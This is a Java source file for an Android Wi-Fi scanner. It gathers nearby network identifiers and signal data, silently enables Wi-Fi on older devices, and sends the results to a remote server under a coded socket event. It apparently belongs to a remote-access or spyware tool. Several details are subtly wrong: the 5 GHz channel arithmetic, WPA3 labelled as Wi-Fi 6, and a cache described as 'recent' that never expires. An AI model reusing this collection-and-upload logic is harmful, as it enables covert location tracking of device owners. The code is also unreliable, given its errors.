package com.fason.app.features.wifi;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.location.LocationManager;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiManager;
import android.os.Build;

import androidx.core.content.ContextCompat;

import com.fason.app.core.permissions.PermissionManager;
import com.fason.app.core.network.SocketClient;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.Comparator;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

public class WifiScanner {

    private static final int MAX_NETWORKS = 50;
    private static final long SCAN_TIMEOUT_MS = 15000; // 15 seconds timeout

    private static final AtomicBoolean isScanning = new AtomicBoolean(false);
    private static final ExecutorService executor = Executors.newSingleThreadExecutor();
    private static final AtomicReference<JSONArray> cachedResults = new AtomicReference<>();

    /**
     * Perform WiFi scan and return results
     */
    public static JSONObject scan(Context ctx) {
        JSONObject result = new JSONObject();
        JSONArray networks = new JSONArray();

        try {
            result.put("networks", networks);

            WifiManager wm = (WifiManager) ctx.getSystemService(Context.WIFI_SERVICE);
            LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);

            if (wm == null) {
                result.put("error", "WiFi not available");
                return result;
            }

            // Check if WiFi is enabled
            if (!wm.isWifiEnabled()) {
                // Try to enable WiFi (requires CHANGE_WIFI_STATE permission)
                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                    try {
                        wm.setWifiEnabled(true);
                        Thread.sleep(1000); // Wait for WiFi to enable
                    } catch (Exception ignored) {}
                }

                if (!wm.isWifiEnabled()) {
                    result.put("error", "WiFi disabled");
                    return result;
                }
            }

            // Check location permission (required for WiFi scan on Android 6+)
            if (!PermissionManager.canIUse(Manifest.permission.ACCESS_FINE_LOCATION) &&
                !PermissionManager.canIUse(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                result.put("error", "Location permission required");
                return result;
            }

            // Check if location is enabled (required on Android 6+)
            boolean locEnabled = lm != null &&
                (lm.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
                 lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER));

            if (!locEnabled && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                result.put("error", "Location service required");
                return result;
            }

            // Use cached results if available and recent
            JSONArray cached = cachedResults.get();
            if (cached != null && cached.length() > 0) {
                result.put("networks", cached);
                result.put("total", cached.length());
                result.put("cached", true);
                return result;
            }

            // Perform async scan with timeout
            JSONArray scanResults = performAsyncScan(ctx, wm);

            if (scanResults != null && scanResults.length() > 0) {
                result.put("networks", scanResults);
                result.put("total", scanResults.length());
                cachedResults.set(scanResults);
            } else {
                // Fallback: try to get cached scan results from system
                List<ScanResult> systemResults = wm.getScanResults();
                if (systemResults != null && !systemResults.isEmpty()) {
                    processResults(systemResults, networks);
                    result.put("total", networks.length());
                    result.put("cached", true);
                } else {
                    result.put("error", "No networks found");
                }
            }

        } catch (Exception e) {
            try {
                result.put("error", e.getMessage());
            } catch (Exception ignored) {}
        }

        return result;
    }

    /**
     * Perform async WiFi scan with broadcast receiver
     */
    private static JSONArray performAsyncScan(Context ctx, WifiManager wm) {
        if (!isScanning.compareAndSet(false, true)) {
            return null; // Already scanning
        }

        final CountDownLatch latch = new CountDownLatch(1);
        final AtomicReference<JSONArray> results = new AtomicReference<>();

        BroadcastReceiver receiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                try {
                    List<ScanResult> scanResults = wm.getScanResults();
                    if (scanResults != null && !scanResults.isEmpty()) {
                        JSONArray networks = new JSONArray();
                        processResults(scanResults, networks);
                        results.set(networks);
                    }
                } catch (Exception ignored) {}

                latch.countDown();
                isScanning.set(false);

                try {
                    ctx.unregisterReceiver(this);
                } catch (Exception ignored) {}
            }
        };

        // Register receiver
        try {
            IntentFilter filter = new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                ctx.registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED);
            } else {
                ctx.registerReceiver(receiver, filter);
            }
        } catch (Exception e) {
            isScanning.set(false);
            return null;
        }

        // Trigger scan
        boolean scanStarted = wm.startScan();

        if (!scanStarted) {
            try {
                ctx.unregisterReceiver(receiver);
            } catch (Exception ignored) {}
            isScanning.set(false);
            return null;
        }

        // Wait for results with timeout
        try {
            boolean completed = latch.await(SCAN_TIMEOUT_MS, TimeUnit.MILLISECONDS);
            if (!completed) {
                try {
                    ctx.unregisterReceiver(receiver);
                } catch (Exception ignored) {}
            }
        } catch (InterruptedException e) {
            try {
                ctx.unregisterReceiver(receiver);
            } catch (Exception ignored) {}
        }

        isScanning.set(false);
        return results.get();
    }

    /**
     * Process scan results into JSON array
     */
    private static void processResults(List<ScanResult> scans, JSONArray networks) {
        // Sort by signal strength
        scans.sort(Comparator.comparingInt((ScanResult s) -> s.level).reversed());

        int limit = Math.min(scans.size(), MAX_NETWORKS);
        for (int i = 0; i < limit; i++) {
            ScanResult sr = scans.get(i);
            try {
                JSONObject net = new JSONObject();
                net.put("BSSID", sr.BSSID != null ? sr.BSSID : "");
                net.put("SSID", sr.SSID != null ? sr.SSID : "");
                net.put("level", sr.level);
                net.put("frequency", sr.frequency);

                // Signal strength in percentage (approximate)
                int signalPercent = calculateSignalStrength(sr.level);
                net.put("signalStrength", signalPercent);

                // Capabilities (encryption type)
                net.put("capabilities", sr.capabilities != null ? sr.capabilities : "");
                net.put("secure", sr.capabilities != null &&
                    (sr.capabilities.contains("WPA") || sr.capabilities.contains("WEP")));

                // Channel (from frequency)
                net.put("channel", frequencyToChannel(sr.frequency));

                // WiFi 6 support (Android 10+)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                        // Check for WiFi 6 (802.11ax) support
                        net.put("wifi6", sr.capabilities != null && sr.capabilities.contains("WPA3"));
                    }
                }

                networks.put(net);
            } catch (Exception ignored) {}
        }
    }

    /**
     * Calculate signal strength percentage from dBm
     */
    private static int calculateSignalStrength(int rssi) {
        // RSSI range is typically -100 (weak) to -30 (strong)
        int percent = (int) ((rssi + 100) * 100.0 / 70);
        return Math.max(0, Math.min(100, percent));
    }

    /**
     * Convert frequency to WiFi channel
     */
    private static int frequencyToChannel(int freq) {
        if (freq >= 2412 && freq <= 2484) {
            return (freq - 2407) / 5;
        } else if (freq >= 5170 && freq <= 5825) {
            return (freq - 5170) / 5 + 34;
        }
        return freq;
    }

    /**
     * Clear cached results
     */
    public static void clearCache() {
        cachedResults.set(null);
    }

    /**
     * Scan and emit results to server
     */
    public static void scanAndEmit(Context ctx) {
        executor.execute(() -> {
            JSONObject result = scan(ctx);
            SocketClient.getInstance().getSocket().emit("0xWI", result);
        });
    }
}
